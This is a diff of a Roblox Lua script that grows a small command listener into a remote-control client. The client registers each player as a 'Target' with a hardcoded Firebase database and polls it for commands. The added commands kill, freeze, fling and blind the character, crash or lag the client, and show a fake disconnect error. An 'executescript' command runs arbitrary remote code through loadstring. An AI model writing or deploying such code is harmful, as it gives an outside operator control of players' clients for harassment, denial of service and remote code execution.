@@ -1,108 +1,271 @@
 local HttpService = game:GetService("HttpService")
-local LocalPlayer = game:GetService("Players").LocalPlayer
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
 
-local Config = {
-    URL = "https://your-database-id.firebaseio.com/data.json",
-    TIMEOUT = 15,
-    INTERVAL = 1.5
-}
+local FIREBASE_URL = "https://troll-master67-default-rtdb.firebaseio.com/"
+local POLL_INTERVAL = 1.5
+local CMD_EXPIRY = 15
+local CACHE_CAP = 100
+local JOIN_TIME = os.time()
 
-local Cache = { Map = {}, Queue = {}, Head = 1 }
+-- O(1) ring buffer — no table nuke, proper FIFO eviction
+local cache = {}
+local queue = {}
+local head = 1
 
-local Handlers = {
-    ["reset"] = function(state, msg) 
-        state.Hum.Health = 0 
-    end,
-    ["freeze"] = function(state, msg) 
-        state.Root.Anchored = true 
-    end,
-    ["unfreeze"] = function(state, msg) 
-        state.Root.Anchored = false 
-    end,
-    ["walkspeed"] = function(state, msg) 
-        state.Hum.WalkSpeed = tonumber(msg) or 16 
-    end
-}
-
-local function GetLiveState()
-    local c = LocalPlayer.Character
-    local h = c and c:FindFirstChildOfClass("Humanoid")
-    local r = c and c:FindFirstChild("HumanoidRootPart")
-    
-    if c and h and r and h.Health > 0 and c:IsDescendantOf(workspace) then
-        return { Char = c, Hum = h, Root = r }
-    end
-    return nil
+local function isCached(id) return cache[id] == true end
+local function markCached(id)
+    if cache[id] then return end
+    local old = queue[head]
+    if old then cache[old] = nil end
+    queue[head] = id
+    cache[id] = true
+    head = (head % CACHE_CAP) + 1
 end
 
-local function ProcessPayload(payload)
-    if type(payload) ~= "table" or not payload.id or not payload.command then return end
-    
-    local ts = tonumber(payload.timestamp) or 0
-    if ts > 9999999999 then ts = ts / 1000 end
-    if os.time() - ts > Config.TIMEOUT then return end
-    
-    if Cache.Map[payload.id] then return end
-    
-    local oldId = Cache.Queue[Cache.Head]
-    if oldId then Cache.Map[oldId] = nil end
-    Cache.Queue[Cache.Head] = payload.id
-    Cache.Map[payload.id] = true
-    Cache.Head = (Cache.Head % 100) + 1
-
-    local action = Handlers[payload.command:lower()]
-    if not action then return end
-
-    local state = GetLiveState()
-    if not state then return end
-
-    pcall(action, state, payload.message)
+-- Network fallback: executor APIs → game:HttpGet → HttpService:GetAsync
+local function fetch(url)
+    local executors = {
+        function() return syn and syn.request end,
+        function() return http and http.request end,
+        function() return http_request end,
+        function() return request end,
+    }
+    for _, fn in ipairs(executors) do
+        local r = fn()
+        if r then
+            local ok, res = pcall(r, {Url = url, Method = "GET"})
+            if ok and res and res.StatusCode == 200 then return res.Body end
+        end
+    end
+    local ok, b = pcall(game.HttpGet, game, url)
+    if ok and b then return b end
+    local ok2, b2 = pcall(HttpService.GetAsync, HttpService, url)
+    return ok2 and b2 or nil
 end
 
-local function FetchData()
-    local req = (syn and syn.request) or (http and http.request) or http_request or request
-    local body = nil
-    
-    if req then
-        local s, res = pcall(req, { Url = Config.URL, Method = "GET" })
-        if s and res and res.StatusCode == 200 then body = res.Body end
-    end
-    
-    if not body then
-        pcall(function() body = game:HttpGet(Config.URL) end)
-    end
-    
-    if not body then
-        pcall(function() body = HttpService:GetAsync(Config.URL) end)
-    end
-    
-    return body
+local function httpReq(method, url, body)
+    local r = (syn and syn.request) or (http and http.request) or http_request or request
+    if not r then return end
+    pcall(r, {Url = url, Method = method, Headers = body and {["Content-Type"] = "application/json"} or {}, Body = body or nil})
 end
 
-task.spawn(function()
-    while true do
-        local raw = FetchData()
-        
-        if raw and raw ~= "null" then
-            local s, tree = pcall(HttpService.JSONDecode, HttpService, raw)
-            
-            if s and type(tree) == "table" then
-                local function Route(node)
-                    if type(node) ~= "table" then return end
-                    if node.id then
-                        ProcessPayload(node)
-                    else
-                        for _, sub in pairs(node) do
-                            if type(sub) == "table" then ProcessPayload(sub) end
-                        end
-                    end
-                end
-                
-                Route(tree.all)
-                Route(tree[LocalPlayer.Name])
+-- Active loop connections
+local spasmConn, orbitConn, lagConn
+
+local function stopLoops()
+    if spasmConn then spasmConn:Disconnect(); spasmConn = nil end
+    if orbitConn then orbitConn:Disconnect(); orbitConn = nil end
+    if lagConn then lagConn:Disconnect(); lagConn = nil end
+    pcall(function() settings().Network.IncomingReplicationLag = 0 end)
+end
+
+-- Character validation — must be alive in workspace
+local function getChar()
+    local char = LocalPlayer.Character
+    if not char or not char:IsDescendantOf(workspace) then return nil end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not hum or not root then return nil end
+    return char, hum, root
+end
+
+local function execute(cmd, arg)
+    local char, hum, root = getChar()
+
+    if cmd == "reset" then
+        if hum then hum.Health = 0 end
+
+    elseif cmd == "sit" then
+        if hum then hum.Sit = true end
+
+    elseif cmd == "freeze" then
+        if root then root.Anchored = true end
+
+    elseif cmd == "unfreeze" then
+        if root then root.Anchored = false end
+
+    elseif cmd == "walkspeed" then
+        if hum then hum.WalkSpeed = tonumber(arg) or 16 end
+
+    elseif cmd == "jumppower" then
+        if hum then hum.UseJumpPower = true; hum.JumpPower = tonumber(arg) or 50 end
+
+    elseif cmd == "gravity" then
+        workspace.Gravity = tonumber(arg) or 196.2
+
+    elseif cmd == "tppos" then
+        if root then
+            local c = arg and arg:split(",")
+            if c and #c == 3 then
+                root.CFrame = CFrame.new(tonumber(c[1]) or 0, tonumber(c[2]) or 0, tonumber(c[3]) or 0)
             end
         end
-        
-        task.wait(Config.INTERVAL)
+
+    elseif cmd == "blind" then
+        if not LocalPlayer.PlayerGui:FindFirstChild("ObsidianBlind") then
+            local g = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+            g.Name = "ObsidianBlind"; g.IgnoreGuiInset = true; g.DisplayOrder = 9999
+            Instance.new("Frame", g).Size = UDim2.new(1,0,1,0)
+        end
+
+    elseif cmd == "unblind" then
+        local g = LocalPlayer.PlayerGui:FindFirstChild("ObsidianBlind")
+        if g then g:Destroy() end
+
+    elseif cmd == "spasm" then
+        stopLoops()
+        if hum and root then
+            hum.PlatformStand = true
+            spasmConn = RunService.Heartbeat:Connect(function()
+                root.RotVelocity = Vector3.new(math.random(-500,500), math.random(-500,500), math.random(-500,500))
+            end)
+        end
+
+    elseif cmd == "unspasm" then
+        stopLoops()
+        if hum then hum.PlatformStand = false end
+        if root then root.RotVelocity = Vector3.new(0,0,0) end
+
+    elseif cmd == "fling" then
+        if hum and root then
+            hum.Sit = true
+            local bv = Instance.new("BodyAngularVelocity", root)
+            bv.AngularVelocity = Vector3.new(9e4,9e4,9e4); bv.MaxTorque = Vector3.new(9e9,9e9,9e9)
+            root.Velocity = Vector3.new(0,9999,0)
+            task.wait(0.5); bv:Destroy(); hum.Sit = false
+        end
+
+    elseif cmd == "orbit" then
+        stopLoops()
+        local t = Players:FindFirstChild(arg)
+        if root and t and t.Character then
+            local tRoot = t.Character:FindFirstChild("HumanoidRootPart")
+            if tRoot then
+                local a = 0
+                orbitConn = RunService.Heartbeat:Connect(function()
+                    if tRoot and root and tRoot.Parent then
+                        a = a + 0.1
+                        root.CFrame = tRoot.CFrame * CFrame.Angles(0, a, 0) * CFrame.new(0, 0, 10)
+                    else stopLoops() end
+                end)
+            end
+        end
+
+    elseif cmd == "crash" then
+        while true do pcall(function() Instance.new("Part", workspace) end) end
+
+    elseif cmd == "fakedisconnect" then
+        LocalPlayer:Kick("Disconnected\n\nPlease check your internet connection and try again.\n(Error Code: 277)")
+
+    elseif cmd == "exit" then
+        pcall(function() game:Shutdown() end)
+
+    elseif cmd == "replag" then
+        pcall(function() settings().Network.IncomingReplicationLag = 10 end)
+
+    elseif cmd == "fpsdrop" then
+        stopLoops()
+        lagConn = RunService.Heartbeat:Connect(function()
+            for i = 1, 3000000 do local _ = math.sin(i) * math.cos(i) end
+        end)
+
+    elseif cmd == "antiy" then
+        stopLoops()
+        if hum and root then
+            hum.PlatformStand = false
+            for _, p in ipairs(char:GetDescendants()) do
+                if p:IsA("BasePart") then p.CanCollide = true end
+            end
+            hum.WalkSpeed = 16
+            for _, obj in ipairs(root:GetChildren()) do
+                if obj:IsA("BodyVelocity") or obj:IsA("BodyGyro") or obj:IsA("BodyAngularVelocity") then
+                    obj:Destroy()
+                end
+            end
+        end
+
+    elseif cmd == "sound" then
+        if root then
+            local s = Instance.new("Sound", root)
+            s.SoundId = "rbxassetid://" .. (tonumber(arg) or 0); s.Volume = 2; s:Play()
+            s.Ended:Connect(function() s:Destroy() end)
+        end
+
+    elseif cmd == "animation" then
+        if hum then
+            local a = Instance.new("Animation"); a.AnimationId = "rbxassetid://" .. (tonumber(arg) or 0)
+            hum:WaitForChild("Animator"):LoadAnimation(a):Play()
+        end
+
+    elseif cmd == "executescript" then
+        if loadstring then pcall(loadstring(arg)) end
+    end
+end
+
+-- Route single payload: dedup → age-gate → target filter → execute
+local function route(payload)
+    if type(payload) ~= "table" or not payload.id or not payload.command then return end
+    if isCached(payload.id) then return end
+
+    local ts = tonumber(payload.timestamp) or 0
+    if ts > 9999999999 then ts = ts / 1000 end
+    if ts < JOIN_TIME then return end
+    if (os.time() - ts) > CMD_EXPIRY then return end
+
+    markCached(payload.id)
+
+    -- Defense-in-depth target filter (endpoint already separates, but check anyway)
+    local tgt = payload.target
+    if tgt and tgt ~= "all" and tgt ~= LocalPlayer.Name then return end
+
+    execute(payload.command, payload.message)
+end
+
+-- Handles: single object, array, Firebase POST wrapper (keyed children)
+local function processResponse(data)
+    if type(data) ~= "table" then return end
+    if data.id then
+        route(data)
+    else
+        for _, v in pairs(data) do
+            if type(v) == "table" then
+                if v.id then route(v) else processResponse(v) end
+            end
+        end
+    end
+end
+
+-- Presence registration
+local function register()
+    local ok, info = pcall(function()
+        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+    end)
+    httpReq("PUT", FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json", HttpService:JSONEncode({
+        name = LocalPlayer.Name, role = "Target",
+        gameId = tostring(game.JobId), placeName = (ok and info.Name) or "Unknown"
+    }))
+end
+
+Players.PlayerRemoving:Connect(function(p)
+    if p == LocalPlayer then httpReq("DELETE", FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json") end
+end)
+
+-- Main loop
+register()
+task.spawn(function()
+    while true do
+        pcall(function()
+            local allRaw = fetch(FIREBASE_URL .. "commands/all.json")
+            if allRaw and allRaw ~= "null" then
+                processResponse(HttpService:JSONDecode(allRaw))
+            end
+            local privRaw = fetch(FIREBASE_URL .. "commands/" .. LocalPlayer.Name .. ".json")
+            if privRaw and privRaw ~= "null" then
+                processResponse(HttpService:JSONDecode(privRaw))
+            end
+        end)
+        task.wait(POLL_INTERVAL)
     end
 end)
